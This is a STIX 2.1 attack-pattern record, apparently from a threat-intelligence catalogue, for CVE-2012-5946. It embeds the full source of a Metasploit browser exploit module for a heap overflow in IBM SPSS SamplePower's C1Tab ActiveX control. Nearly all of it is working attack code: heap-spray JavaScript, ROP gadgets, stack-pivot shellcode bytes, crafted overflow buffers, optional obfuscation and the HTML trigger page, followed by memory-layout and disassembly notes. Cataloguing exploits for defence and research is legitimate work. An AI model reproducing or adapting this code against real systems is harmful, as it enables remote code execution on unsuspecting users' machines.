{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bafd2e56-2be6-4ef7-bb18-a8b899d37739",
    "created": "2024-08-14T16:43:33.671839Z",
    "modified": "2024-08-14T16:43:33.671842Z",
    "name": "\"IBM SPSS SamplePower C1Tab ActiveX Heap Overflow\"",
    "description": " This module exploits a heap based buffer overflow in the C1Tab ActiveX control while handling the TabCaption property. The affected control can be found in the c1sizer.ocx component as included with IBM SPSS SamplePower 3.0. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3 and IE 8 on Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ibm_spss_c1sizer.rb",
            "external_id": "ibm_spss_c1sizer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5946"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21635476"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{24E04EBF-014D-471F-930E-7654B1193BA9}\",\n  #  :method     => \"TabCaption\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM SPSS SamplePower C1Tab ActiveX Heap Overflow\",\n      'Description'    => %q{\n          This module exploits a heap based buffer overflow in the C1Tab ActiveX control,\n        while handling the TabCaption property. The affected control can be found in the\n        c1sizer.ocx component as included with IBM SPSS SamplePower 3.0. This module has\n        been tested successfully on IE 6, 7 and 8 on Windows XP SP3 and IE 8 on Windows 7\n        SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexander Gavrun', # Vulnerability discovery\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-5946' ],\n          [ 'OSVDB', '92845' ],\n          [ 'BID', '59559' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21635476' ],\n          [ 'ZDI', '13-100' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 991,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # IBM SPSS SamplePower 3.0 / c1sizer.ocx 8.0.20071.39\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',\n            {\n              'Offset' => '0x5F4',\n              'Ret' => 0x0c0c0c08\n            }\n          ],\n          [ 'IE 7 on Windows XP SP3',\n            {\n              'Offset' => '0x5F4',\n              'Ret' => 0x0c0c0c08\n            }\n          ],\n          [ 'IE 8 on Windows XP SP3',\n            {\n              'Offset' => '0x5f4',\n              'Ret' => 0x0c0c0c0c,\n              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret\n            }\n          ],\n          [ 'IE 8 on Windows 7',\n            {\n              'Offset' => '0x5f4',\n              'Ret' => 0x0c0c0c0c,\n              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n    print_status(\"target not found #{agent}\")\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    # For IE 6, 7, 8\n    js = %Q|\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n    heap_obj.gc();\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def rop_chain\n    # gadgets from c1sizer.ocx\n    rop_gadgets =\n      [\n        0x0c0c0c10,\n        0x10026984, # ADD ESP,10 # POP EDI # POP ESI # POP EBX # POP EBP # RETN # stackpivot to the controlled stack\n        0x100076f1, # pop eax # ret\n        0x10029134, # &VirtualAllox\n        0x1001b41e, # jmp [eax]\n        0x0c0c0c34, # ret address\n        0x0c0c0c0c,\t# lpAddress\n        0x00001000, # dwSize\n        0x00001000, # flAllocationType\n        0x00000040  # flProtect\n      ].pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n    # No rop. Just return the payload.\n\n    if (t.name =~ /IE 6/ or t.name =~ /IE 7/)\n      fake_memory = [\n        0x0c0c0c10,\n        0x0c0c0c14\n      ].pack(\"V*\")\n      return fake_memory + code\n    end\n\n    return rop_chain + stack_pivot + code\n  end\n\n  # Objects filling aren't randomized because\n  # this combination make exploit more reliable.\n  def fake_object(size)\n    object = \"B\" * 8     # metadata\n    object << \"D\" * size # fake object\n    return object\n  end\n\n  def stack_pivot\n    pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    pivot << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    pivot << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n    return pivot\n  end\n\n  # Check the memory layout documentation at the end of the module\n  def overflow_xp\n    buf = rand_text_alpha(0x10000)\n    # Start to overflow\n    buf << fake_object(0x40)\n    buf << fake_object(0x30)\n    buf << fake_object(0x30)\n    buf << fake_object(0x40)\n    buf << fake_object(0x10)\n    buf << fake_object(0x10)\n    buf << fake_object(0x20)\n    buf << fake_object(0x10)\n    buf << fake_object(0x30)\n    buf << \"B\" * 0x8     # metadata chunk\n    buf << \"\\x0c\" * 0x40 # Overflow first 0x40 of the exploited object\n  end\n\n  # Check the memory layout documentation at the end of the module\n  def overflow_xp_ie8\n    buf = [\n      junk,       # padding\n      0x1001b557, # pop eax # c1sizer.ocx\n      0x0c0c0c14, # eax\n      0x10028ad8  # xchg eax,esp # c1sizer.ocx # stackpivot to the heap\n    ].pack(\"V*\")\n    buf << rand_text_alpha(0x10000-16)\n    # Start to overflow\n    buf << \"B\" * 0x8     # metadata chunk\n    buf << \"\\x0c\" * 0x40 # Overflow first 0x40 of the exploited object\n  end\n\n  # Check the memory layout documentation at the end of the module\n  def overflow_w7\n    buf = [\n      junk,       # padding\n      0x1001b557, # pop eax # c1sizer.ocx\n      0x0c0c0c14, # eax\n      0x10028ad8  # xchg eax,esp # c1sizer.ocx # stackpivot to the heap\n    ].pack(\"V*\")\n    buf << rand_text_alpha(0x10000-16)\n    # Start to oveflow\n    buf << fake_object(0x3f8)\n    buf << fake_object(0x1a0)\n    buf << fake_object(0x1e0)\n    buf << fake_object(0x1a0)\n    buf << fake_object(0x1e0)\n    buf << fake_object(0x1a0)\n    buf << \"B\" * 0x8     # metadata chunk\n    buf << \"\\x0c\" * 0x40 # Overflow first 0x40 of the exploited object\n  end\n\n  def get_overflow(t)\n    if t.name =~ /Windows 7/\n      return overflow_w7\n    elsif t.name =~ /Windows XP/ and t.name =~ /IE 8/\n      return overflow_xp_ie8\n    elsif t.name =~ /Windows XP/\n      return overflow_xp\n    end\n  end\n\n  # * 15 C1TAB objects are used to defragement the heap, so objects are stored after the vulnerable buffer.\n  # * Based on empirical tests, 5th C1TAB comes after the vulnerable buffer.\n  # * Using the 7th CITAB is possible to overflow itself and get control before finishing the set of the\n  # TabCaption property.\n  def trigger_w7\n    target = rand_text_alpha(5 + rand(3))\n    target2 = rand_text_alpha(5 + rand(3))\n    target3 = rand_text_alpha(5 + rand(3))\n    target4 = rand_text_alpha(5 + rand(3))\n    target5 = rand_text_alpha(5 + rand(3))\n    target6 = rand_text_alpha(5 + rand(3))\n    target7 = rand_text_alpha(5 + rand(3))\n    target8 = rand_text_alpha(5 + rand(3))\n    target9 = rand_text_alpha(5 + rand(3))\n    target10 = rand_text_alpha(5 + rand(3))\n    target11 = rand_text_alpha(5 + rand(3))\n    target12 = rand_text_alpha(5 + rand(3))\n    target13 = rand_text_alpha(5 + rand(3))\n    target14 = rand_text_alpha(5 + rand(3))\n    target15 = rand_text_alpha(5 + rand(3))\n\n    objects = %Q|\n    <object id=\"#{target}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target2}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target3}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target4}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target5}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target6}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target7}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target8}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target9}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target10}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target11}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target12}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target13}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target14}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    <object id=\"#{target15}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    |\n    return objects, target7\n  end\n\n  # * Based on empirical test, the C1TAB object comes after the vulnerable buffer on memory, so just\n  # an object is sufficient to overflow itself and get control execution.\n  def trigger_xp\n    target = rand_text_alpha(5 + rand(3))\n\n    objects = %Q|\n    <object id=\"#{target}\" width=\"100%\" height=\"100%\" classid=\"clsid:24E04EBF-014D-471F-930E-7654B1193BA9\"></object>\n    |\n    return objects, target\n  end\n\n  def get_trigger(t)\n    if t.name =~ /Windows 7/\n      return trigger_w7\n    elsif t.name =~ /Windows XP/\n      return trigger_xp\n    end\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n    buf = get_overflow(my_target)\n\n    objects, target_object = get_trigger(my_target)\n\n    html = %Q|\n    <html>\n    <head>\n    </head>\n    <body>\n    #{objects}\n    <script>\n    CollectGarbage();\n    #{js}\n    #{target_object}.Caption = \"\";\n    #{target_object}.TabCaption(0) = \"#{buf}\";\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\n\n[*] Windows XP / ie6 & ie7 memory layout at oveflow, based on empirical test\n\n    Heap entries for Segment01 in Heap 01ca0000\n         address: psize . size  flags   state (requested size)\n        025c0000: 00000 . 00040 [01] - busy (40)\n        025c0040: 00040 . 10008 [01] - busy (10000)\n        025d0048: 10008 . 10008 [01] - busy (10000) // Overflowed buffer\n        025e0050: 10008 . 00048 [01] - busy (40)\n        025e0098: 00048 . 00038 [01] - busy (30)\n        025e00d0: 00038 . 00038 [01] - busy (30)\n        025e0108: 00038 . 00048 [01] - busy (40)\n        025e0150: 00048 . 00018 [01] - busy (10)\n        025e0168: 00018 . 00018 [01] - busy (10)\n        025e0180: 00018 . 00028 [01] - busy (20)\n        025e01a8: 00028 . 00018 [01] - busy (10)\n        025e01c0: 00018 . 00010 [00]\n        025e01d0: 00010 . 00038 [01] - busy (30)\n        025e0208: 00038 . 001e8 [01] - busy (1e0)   // Vulnerable object\n        025e03f0: 001e8 . 001a8 [01] - busy (1a0)\n\n\n[*] Windows XP / ie8 memory layout at oveflow, based on empirical test\n\n    Heap entries for Segment01 in Heap 03350000\n         address: psize . size  flags   state (requested size)\n        03840000: 00000 . 00040 [01] - busy (40)\n        03840040: 00040 . 10008 [01] - busy (10000)\n        03850048: 10008 . 10008 [01] - busy (10000) // Overflowed buffer\n        03860050: 10008 . 001e8 [01] - busy (1e0)   // Vulnerable object\n        03860238: 001e8 . 001a8 [01] - busy (1a0)\n        038603e0: 001a8 . 00078 [00]\n        03860458: 00078 . 00048 [01] - busy (40)\n        038604a0: 00048 . 00048 [01] - busy (40)\n        038604e8: 00048 . 00618 [01] - busy (610)\n        03860b00: 00618 . 10208 [01] - busy (10200)\n        03870d08: 10208 . 032f8 [10]\n        03874000:      000cc000      - uncommitted bytes.\n\n\n[*] windows 7 / ie8 memory layout at oveflow, based on empirical test\n\n  03240000: 00000 . 00040 [101] - busy (3f)\n  03240040: 00040 . 10008 [101] - busy (10000)\n  03250048: 10008 . 10008 [101] - busy (10000) # Overwritten buffer\n  03260050: 10008 . 00400 [101] - busy (3f8) Internal\n  03260450: 00400 . 001a8 [101] - busy (1a0)\n  032605f8: 001a8 . 001e8 [101] - busy (1e0)\n  032607e0: 001e8 . 001a8 [101] - busy (1a0)\n  03260988: 001a8 . 001e8 [101] - busy (1e0)\n  03260b70: 001e8 . 001a8 [101] - busy (1a0)\n  03260d18: 001a8 . 001e8 [101] - busy (1e0)   # Our vulnerable object, target7, seems reliable according to testing\n  03260f00: 001e8 . 001a8 [101] - busy (1a0)\n  032610a8: 001a8 . 001e8 [101] - busy (1e0)\n  03261290: 001e8 . 001a8 [101] - busy (1a0)\n  03261438: 001a8 . 001e8 [101] - busy (1e0)\n  03261620: 001e8 . 001a8 [101] - busy (1a0)\n  032617c8: 001a8 . 001e8 [101] - busy (1e0)\n\n[*] Overflow:\n\n.text:100146E1                 push    eax             ; lpString2\n.text:100146E2                 push    CaptionlpBuffer ; lpString1\n.text:100146E8                 call    ds:lstrcatA     ; Heap Overflow when setting a new CaptionString > 0x10000\n\n[*] Get Control after overflow:\n\n.text:1001A40D                 call    overflow_sub_1001469E ; Overflow happens here\n.text:1001A412                 mov     ecx, edi        ; edi points to the overflowed object, then ecx (this)\n.text:1001A414                 call    get_control_sub_100189EC ; Get profit from the overflowed object here\n\n.text:100189EC get_control_sub_100189EC proc near      ; CODE XREF: sub_1001A1A9+B6\u0019p\n.text:100189EC                                         ; SetTabCaption_sub_1001A2EC+128\u0019p ...\n.text:100189EC\n.text:100189EC var_4           = dword ptr -4\n.text:100189EC\n.text:100189EC                 push    ebp\n.text:100189ED                 mov     ebp, esp\n.text:100189EF                 push    ecx\n.text:100189F0                 mov     eax, [ecx+10h] # ecx points to controlled memory, so eax can be controlled\n.text:100189F3                 and     [ebp+var_4], 0\n.text:100189F7                 test    eax, eax\n.text:100189F9                 jz      short locret_10018A23\n.text:100189FB                 mov     ecx, [eax] # eax can be controlled and make it point to sprayed mem, ecx can be controlled\n.text:100189FD                 lea     edx, [ebp+var_4]\n.text:10018A00                 push    edx\n.text:10018A01                 push    offset unk_1002B628\n.text:10018A06                 push    eax\n.text:10018A07                 call    dword ptr [ecx] # woot!\n\n=end\n",
    "x_mitre_disclosure_date": "2013-04-26",
    "x_mitre_platforms": [
        "win'"
    ]
}